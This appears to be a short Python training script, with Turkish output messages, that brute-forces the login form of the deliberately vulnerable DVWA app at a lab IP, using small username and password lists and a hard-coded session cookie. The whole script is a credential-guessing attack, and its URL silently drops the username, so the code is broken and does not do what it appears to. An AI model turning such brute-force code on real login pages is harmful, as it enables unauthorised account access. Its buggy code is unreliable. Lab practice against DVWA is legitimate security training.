import requests
header = {"Cookie": "security=low; PHPSESSID=a0b29e43b154e8cf261c3a93686bdd94"}
username_list=["admin","password"]
password_list=["admin","password"]
for i in username_list:
    for j in password_list:
        url = "http://10.10.10.10/dvwa/vulnerabilities/brute/?username=" + "&password=" + str(j) + "&Login=Login"
        sonuc = requests.get(url=url, headers=header)
        print("Username: ", i)
        print("Password: ", j)
        print("Status code: ",sonuc.status_code)
        print("Uzunluk: ", len(sonuc.content))
        if not "Username and/or password incorrect" in str(sonuc.content):
            print("Kullanıcı adı ve parola doğru.")
        print("=======================")